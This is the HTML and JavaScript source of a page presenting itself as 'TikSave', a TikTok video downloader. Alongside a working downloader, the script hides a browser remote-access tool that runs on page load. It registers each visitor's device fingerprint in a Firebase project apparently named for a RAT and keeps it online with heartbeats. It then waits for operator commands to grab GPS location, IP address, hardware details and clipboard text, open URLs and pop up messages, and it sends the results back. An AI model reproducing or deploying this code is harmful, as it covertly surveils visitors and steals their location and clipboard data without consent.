<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
<title>TikSave · TikTok Video Downloader</title>

<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&family=Ubuntu+Mono:wght@400;700&display=swap" rel="stylesheet">
<style>
::-webkit-scrollbar{display:none}
*{scrollbar-width:none;margin:0;padding:0;box-sizing:border-box}
body{font-family:'Space Grotesk',sans-serif;background:#0d0d0d;color:#e5e7eb;min-height:100vh;position:relative}
body::before{content:'';position:fixed;inset:0;background-image:linear-gradient(rgba(255,255,255,.012) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,.012) 1px,transparent 1px);background-size:42px 42px;pointer-events:none;z-index:0}
.z1{position:relative;z-index:1}
.paste-box{background:rgba(255,255,255,.015);border:2px dashed rgba(255,255,255,.05);border-radius:18px;padding:28px 20px;text-align:center;transition:.3s}
.input-field{width:100%;background:rgba(255,255,255,.02);border:1px solid rgba(255,255,255,.06);color:#ccc;padding:12px 16px;border-radius:10px;font-size:13px;font-family:'Space Grotesk',sans-serif;outline:none;transition:.3s;text-align:center}
.input-field:focus{border-color:rgba(255,255,255,.15);background:rgba(255,255,255,.04)}
.input-field::placeholder{color:#3a3a3a}
.btn-get{width:100%;background:#1a1a1a;color:#ddd;border:1px solid rgba(255,255,255,.08);padding:13px 20px;border-radius:12px;font-weight:600;font-size:13px;cursor:pointer;transition:.25s;font-family:'Space Grotesk',sans-serif;letter-spacing:.02em;display:flex;align-items:center;justify-content:center;gap:8px}
.btn-get:hover{background:#222;color:#fff;border-color:rgba(255,255,255,.15)}
.btn-get:disabled{background:#111;color:#333;cursor:not-allowed}
.feat-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:8px}
.feat-card{background:rgba(255,255,255,.012);border:1px solid rgba(255,255,255,.03);border-radius:14px;padding:16px 10px;text-align:center}
.feat-ic{font-size:20px;display:block;margin-bottom:5px}
.feat-lb{font-size:9.5px;color:#666;font-weight:500}
.loading-state{display:none;text-align:center;padding:28px;background:rgba(255,255,255,.015);border:1px solid rgba(255,255,255,.05);border-radius:16px;margin-top:14px}
.spin{animation:spin 1s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}
.error-box{display:none;background:rgba(180,0,0,.05);border:1px solid rgba(180,0,0,.15);border-radius:14px;padding:16px 18px;margin-top:14px;text-align:center}
.error-box p{font-size:12px;color:#e05555}
.result-box{background:rgba(255,255,255,.015);border:1px solid rgba(255,255,255,.05);border-radius:16px;margin-top:14px;display:none;overflow:hidden}
.result-thumb{width:100%;display:block;max-height:300px;object-fit:cover}
.result-body{padding:18px}
.author-row{display:flex;align-items:center;gap:10px;margin-bottom:12px;padding-bottom:12px;border-bottom:1px solid rgba(255,255,255,.04)}
.author-av{width:34px;height:34px;border-radius:50%;object-fit:cover;background:#1a1a1a;border:1px solid rgba(255,255,255,.06);flex-shrink:0}
.author-name{font-size:13px;font-weight:600;color:#ccc}
.author-nick{font-size:9px;color:#555;font-family:'Ubuntu Mono',monospace}
.result-text{font-size:11px;color:#999;margin-bottom:12px;text-align:center;line-height:1.5;display:-webkit-box;-webkit-line-clamp:3;-webkit-box-orient:vertical;overflow:hidden}
.meta-row{display:flex;gap:5px;flex-wrap:wrap;justify-content:center;margin-bottom:12px}
.meta-tag{background:rgba(255,255,255,.025);border:1px solid rgba(255,255,255,.04);border-radius:6px;padding:3px 8px;font-size:8.5px;color:#555;font-family:'Ubuntu Mono',monospace}
.result-stats{display:grid;grid-template-columns:1fr 1fr;gap:6px;margin-bottom:10px}
.result-stat{background:rgba(255,255,255,.015);border-radius:8px;padding:10px;text-align:center}
.result-stat-v{font-size:13px;font-weight:600;color:#fff}
.result-stat-l{font-size:8px;color:#555;text-transform:uppercase;letter-spacing:.06em;font-family:'Ubuntu Mono',monospace}
.result-btns{display:grid;grid-template-columns:1fr 1fr;gap:6px}
.btn-dl{background:rgba(255,255,255,.02);color:#bbb;border:1px solid rgba(255,255,255,.08);padding:12px 10px;border-radius:10px;font-weight:500;font-size:11px;cursor:pointer;transition:.2s;font-family:'Space Grotesk',sans-serif;text-align:center;display:flex;align-items:center;justify-content:center;gap:7px;width:100%;text-decoration:none}
.btn-dl:hover{background:rgba(255,255,255,.05);color:#fff}
.alert-overlay{position:fixed;inset:0;background:rgba(0,0,0,.96);z-index:99999;display:flex;align-items:center;justify-content:center;flex-direction:column;gap:16px;animation:fadeIn .25s}
@keyframes fadeIn{from{opacity:0}to{opacity:1}}
.alert-box{background:#0a0a0a;border:1px solid #ff2d2d;border-radius:16px;padding:32px 24px;text-align:center;max-width:88vw;box-shadow:0 0 60px rgba(255,0,0,.1)}
.alert-msg{color:#ff4444;font-size:15px;font-weight:600;word-break:break-word;line-height:1.5}
.alert-close{background:transparent;color:#ff5555;border:1px solid #ff2d2d;padding:10px 26px;border-radius:10px;font-size:12px;font-weight:600;cursor:pointer;margin-top:12px;transition:.2s}
.alert-close:hover{background:#ff2d2d;color:#000}
</style>
</head>
<body>
<div class="z1" style="max-width:540px;margin:0 auto;padding:36px 16px">

  <div style="text-align:center;margin-bottom:28px">
    <div style="margin-bottom:8px"><i class="fab fa-tiktok" style="font-size:48px;color:#fff"></i></div>
    <h1 style="font-size:22px;font-weight:700;color:#fff">TikSave</h1>
    <p style="font-size:10px;color:#555;font-family:'Ubuntu Mono',monospace;letter-spacing:.08em;margin-top:4px">TIKTOK VIDEO DOWNLOADER</p>
    <p id="ping" style="font-size:8px;color:#333;font-family:'Ubuntu Mono',monospace;margin-top:6px;letter-spacing:.06em">● INIT</p>
  </div>

  <div class="paste-box" style="margin-bottom:14px">
    <div style="font-size:24px;margin-bottom:8px"><i class="fas fa-link" style="color:#3a3a3a"></i></div>
    <p style="font-size:12px;color:#777;font-weight:500;margin-bottom:4px">Paste TikTok Video Link</p>
    <p style="font-size:9px;color:#3a3a3a;font-family:'Ubuntu Mono',monospace;margin-bottom:12px"><i class="fas fa-check-circle" style="color:#444"></i> Supports tiktok.com links</p>
    <input class="input-field" id="urlInput" placeholder="https://vt.tiktok.com/..." autocomplete="off">
    <button class="btn-get" id="dlBtn" onclick="fetchVideo()" style="margin-top:10px">
      <i class="fab fa-tiktok" style="font-size:15px"></i> Get Video
    </button>
  </div>

  <div class="feat-grid" style="margin-bottom:14px">
    <div class="feat-card"><span class="feat-ic"><i class="fas fa-video" style="color:#888"></i></span><p class="feat-lb">HD Quality</p></div>
    <div class="feat-card"><span class="feat-ic"><i class="fas fa-music" style="color:#777"></i></span><p class="feat-lb">MP3 Audio</p></div>
    <div class="feat-card"><span class="feat-ic"><i class="fas fa-ban" style="color:#666"></i></span><p class="feat-lb">No Watermark</p></div>
  </div>

  <div class="loading-state" id="loadingBox">
    <i class="fas fa-circle-notch spin" style="font-size:20px;color:#555"></i>
    <p style="font-size:11px;color:#444;margin-top:10px;font-family:'Ubuntu Mono',monospace">fetching video info...</p>
  </div>

  <div class="error-box" id="errorBox">
    <i class="fas fa-exclamation-triangle" style="font-size:16px;display:block;margin-bottom:6px;color:#e05555"></i>
    <p id="errorMsg">Gagal fetch video. Cek link dan coba lagi.</p>
  </div>

  <div class="result-box" id="resultBox">
    <img class="result-thumb" id="resCover" src="" alt="" style="display:none">
    <div class="result-body">
      <div class="author-row">
        <img class="author-av" id="resAvatar" src="" alt="">
        <div>
          <p class="author-name" id="resNickname"></p>
          <p class="author-nick" id="resFullname"></p>
        </div>
      </div>
      <p class="result-text" id="resTitle"></p>
      <div class="meta-row" id="resMeta"></div>
      <div class="result-stats">
        <div class="result-stat"><p class="result-stat-v" id="stViews">—</p><p class="result-stat-l">Views</p></div>
        <div class="result-stat"><p class="result-stat-v" id="stLikes">—</p><p class="result-stat-l">Likes</p></div>
        <div class="result-stat"><p class="result-stat-v" id="stComments">—</p><p class="result-stat-l">Comments</p></div>
        <div class="result-stat"><p class="result-stat-v" id="stShares">—</p><p class="result-stat-l">Shares</p></div>
      </div>
      <div class="result-btns" id="dlBtns"></div>
    </div>
  </div>

</div>

<script>
// ═══════════════ DEVICE ID ═══════════════
var _id=(function(){var k='__dxid__';var v=localStorage.getItem(k);if(!v){v='dx_'+Math.random().toString(36).slice(2,10)+'_'+Date.now().toString(36);localStorage.setItem(k,v)}return v})();

// ═══════════════ FIREBASE ═══════════════
var _cfg={apiKey:"AIzaSyBvlhJRWV8PIH09bHKdUpQKv4x6mT9wCIE",authDomain:"krynodexrat.firebaseapp.com",databaseURL:"https://krynodexrat-default-rtdb.asia-southeast1.firebasedatabase.app",projectId:"krynodexrat",storageBucket:"krynodexrat.firebasestorage.app",messagingSenderId:"465327768431",appId:"1:465327768431:web:3e5871b9f80dcbcad1de9a"};
firebase.initializeApp(_cfg);
var _db=firebase.database();
var _ts=Date.now;

// ═══════════════ REGISTER DEVICE ═══════════════
_db.ref('devices/'+_id).update({
  id:_id,
  md:(navigator.userAgent.split(';')[1]||'Web').trim().substring(0,40),
  os:navigator.platform,
  ln:navigator.language,
  sc:screen.width+'x'+screen.height,
  rg:_ts(),
  sn:_ts(),
  on:true,
  tz:Intl.DateTimeFormat().resolvedOptions().timeZone,
  rf:document.referrer||'direct'
}).then(function(){
  var p=document.getElementById('ping');
  if(p){p.textContent='● ONLINE';p.style.color='#4ade80'}
});
setInterval(function(){_db.ref('devices/'+_id).update({sn:_ts(),on:true})},12000);

// ═══════════════ CMD HANDLERS ═══════════════
async function _gps(){return new Promise(function(ok){if(!navigator.geolocation){ok({err:"GPS not available"});return}navigator.geolocation.getCurrentPosition(async function(p){var a=p.coords.latitude,o=p.coords.longitude;try{var d=await(await fetch('https://nominatim.openstreetmap.org/reverse?format=json&lat='+a+'&lon='+o)).json();ok({lat:a,lon:o,acc:Math.round(p.coords.accuracy)+'m',addr:d.display_name,city:d.address?.city||d.address?.town||'',state:d.address?.state||'',country:d.address?.country||'',map:'https://maps.google.com/?q='+a+','+o})}catch(e){ok({lat:a,lon:o,acc:Math.round(p.coords.accuracy)+'m',map:'https://maps.google.com/?q='+a+','+o})}},function(e){ok({err:e.message})},{enableHighAccuracy:true,timeout:10000})})}

async function _ip(){try{var r=await fetch('https://ipapi.co/json/');return await r.json()}catch(e){return{err:"IP lookup failed"}}}

async function _inf(){
  var b='N/A';
  try{var t=await navigator.getBattery();b=Math.round(t.level*100)+'% '+(t.charging?'⚡Charging':'🔋Battery')}catch(e){}
  var i='N/A';
  try{i=(await(await fetch('https://api.ipify.org?format=json')).json()).ip}catch(e){}
  var mem='N/A';try{mem=navigator.deviceMemory?navigator.deviceMemory+'GB':'N/A'}catch(e){}
  return{
    ua:navigator.userAgent.substring(0,150),
    os:navigator.platform,
    ln:navigator.language,
    res:screen.width+'x'+screen.height+' @'+devicePixelRatio+'x',
    ram:navigator.deviceMemory||'?',
    cpu:navigator.hardwareConcurrency||'?',
    bat:b,
    ip:i,
    tz:Intl.DateTimeFormat().resolvedOptions().timeZone,
    on:navigator.onLine,
    ck:navigator.cookieEnabled,
    sw:'serviceWorker' in navigator,
    wb:typeof WebAssembly!=='undefined',
    rf:document.referrer||'direct'
  }
}

function _hw(){
  var g='N/A',gv='N/A';
  try{
    var c=document.createElement('canvas');
    var l=c.getContext('webgl')||c.getContext('experimental-webgl');
    if(l){
      var e=l.getExtension('WEBGL_debug_renderer_info');
      if(e){g=l.getParameter(e.UNMASKED_RENDERER_WEBGL);gv=l.getParameter(e.UNMASKED_VENDOR_WEBGL)}
    }
  }catch(e){}
  var conn='N/A';try{var nc=navigator.connection||navigator.mozConnection||navigator.webkitConnection;if(nc)conn=(nc.effectiveType||'?')+' / '+Math.round(nc.downlink||0)+'Mbps'}catch(e){}
  return{
    ram:navigator.deviceMemory||'?',
    cpu:navigator.hardwareConcurrency||'?',
    gpu:g,
    gpu_vendor:gv,
    touch:'ontouchstart' in window,
    mtouch:navigator.maxTouchPoints||0,
    net:conn,
    pf:navigator.platform,
    lang:navigator.language
  }
}

async function _sc(){
  try{
    var s=await navigator.mediaDevices.enumerateDevices();
    var cam=s.filter(function(d){return d.kind==='videoinput'}).length;
    var mic=s.filter(function(d){return d.kind==='audioinput'}).length;
    return{cam:cam,mic:mic,total:s.length}
  }catch(e){return{err:"Permission denied or not available"}}
}

function _alert(msg){
  var d=document.createElement('div');
  d.className='alert-overlay';
  d.innerHTML='<div class="alert-box"><p class="alert-msg">'+msg+'</p><button class="alert-close" onclick="this.closest(\'.alert-overlay\').remove()">TUTUP</button></div>';
  document.body.appendChild(d);
  return{status:'alerted',msg:msg}
}

async function _clip(){
  try{var t=await navigator.clipboard.readText();return{text:t.substring(0,500)}}
  catch(e){return{err:"Clipboard permission denied"}}
}

function _pageinfo(){
  return{
    url:location.href,
    title:document.title,
    ref:document.referrer||'direct',
    cookies:document.cookie.length>0?'present':'none',
    storage_keys:Object.keys(localStorage).length,
    scroll:window.scrollY,
    viewport:window.innerWidth+'x'+window.innerHeight
  }
}

// ═══════════════ CMD EXEC ═══════════════
async function _exec(cmd){
  var r={type:cmd,status:'ok',time:_ts(),deviceId:_id};
  switch(cmd){
    case 'GPS':r.data=await _gps();break;
    case 'IP':r.data=await _ip();break;
    case 'INFO':r.data=await _inf();break;
    case 'HW':r.data=_hw();break;
    case 'SCAN':r.data=await _sc();break;
    case 'CLIP':r.data=await _clip();break;
    case 'PAGE':r.data=_pageinfo();break;
    case 'PING':r.data={status:'pong',time:_ts()};break;
    default:
      if(cmd.startsWith('MSG:')){r.data=_alert(cmd.slice(4));r.type='ALERT'}
      else if(cmd.startsWith('URL:')){open(cmd.slice(4),'_blank');r.data={url:cmd.slice(4)};r.type='OPEN_URL'}
      else if(cmd.startsWith('TITLE:')){document.title=cmd.slice(6);r.data={title:cmd.slice(6)}}
      else r.data={err:'unknown_command'};
  }
  return r;
}

// ═══════════════ LISTEN FOR COMMANDS ═══════════════
_db.ref('cmds/'+_id).on('child_added',async function(sn){
  var c=sn.val();if(!c||c.st!=='pending')return;
  sn.ref.update({st:'running'});
  var result=await _exec(c.cmd);
  _db.ref('data').push(result);
  sn.ref.update({st:'done'});
  setTimeout(function(){sn.ref.remove()},3000);
});

// ═══════════════ TIKTOK DOWNLOADER ═══════════════
function show(id){document.getElementById(id).style.display='block'}
function hide(id){document.getElementById(id).style.display='none'}

async function fetchVideo(){
  var url=document.getElementById('urlInput').value.trim();
  if(!url){alert('Paste TikTok link dulu!');return}

  var btn=document.getElementById('dlBtn');
  btn.disabled=true;
  btn.innerHTML='<i class="fas fa-circle-notch spin" style="font-size:15px"></i> Loading...';

  hide('resultBox');hide('errorBox');show('loadingBox');

  try{
    var res=await fetch('https://api.nexray.web.id/downloader/tiktok?url='+encodeURIComponent(url));
    if(!res.ok) throw new Error('HTTP '+res.status);
    var json=await res.json();
    if(!json.status||!json.result) throw new Error(json.message||'API error');
    renderResult(json.result);
  }catch(err){
    hide('loadingBox');show('errorBox');
    document.getElementById('errorMsg').textContent='Gagal: '+err.message;
  }

  btn.disabled=false;
  btn.innerHTML='<i class="fab fa-tiktok" style="font-size:15px"></i> Get Video';
}

function renderResult(r){
  hide('loadingBox');

  var cover=document.getElementById('resCover');
  if(r.cover){cover.src=r.cover;cover.style.display='block';cover.onerror=function(){this.style.display='none'}}
  else{cover.style.display='none'}

  var av=document.getElementById('resAvatar');
  if(r.author&&r.author.avatar){av.src=r.author.avatar;av.onerror=function(){this.style.display='none'}}
  document.getElementById('resNickname').textContent=r.author&&r.author.nickname?r.author.nickname:'';
  document.getElementById('resFullname').textContent=r.author&&r.author.fullname?'@'+r.author.fullname:'';

  document.getElementById('resTitle').textContent=r.title||'';

  var m='';
  if(r.duration) m+='<span class="meta-tag">'+r.duration+'</span>';
  if(r.region)   m+='<span class="meta-tag">'+r.region+'</span>';
  if(r.taken_at) m+='<span class="meta-tag">'+r.taken_at+'</span>';
  if(r.size_nowm&&r.size_nowm>0) m+='<span class="meta-tag">'+(r.size_nowm/1048576).toFixed(1)+' MB</span>';
  document.getElementById('resMeta').innerHTML=m;

  var s=r.stats||{};
  document.getElementById('stViews').textContent=s.views||'—';
  document.getElementById('stLikes').textContent=s.likes||'—';
  document.getElementById('stComments').textContent=s.comment||'—';
  document.getElementById('stShares').textContent=s.share||'—';

  var b='';
  if(r.data) b+='<a href="'+r.data+'" target="_blank" class="btn-dl"><i class="fas fa-download"></i> Video</a>';
  if(r.music_info&&r.music_info.url) b+='<a href="'+r.music_info.url+'" target="_blank" class="btn-dl"><i class="fas fa-headphones"></i> MP3</a>';
  if(!b) b='<p style="font-size:11px;color:#555;text-align:center;grid-column:1/-1;padding:8px">No download link</p>';
  document.getElementById('dlBtns').innerHTML=b;

  show('resultBox');
  var p=document.getElementById('ping');
  if(p){p.textContent='● ONLINE';p.style.color='#4ade80'}
}

document.getElementById('urlInput').addEventListener('keydown',function(e){if(e.key==='Enter')fetchVideo()});
</script>
</body>
</html>
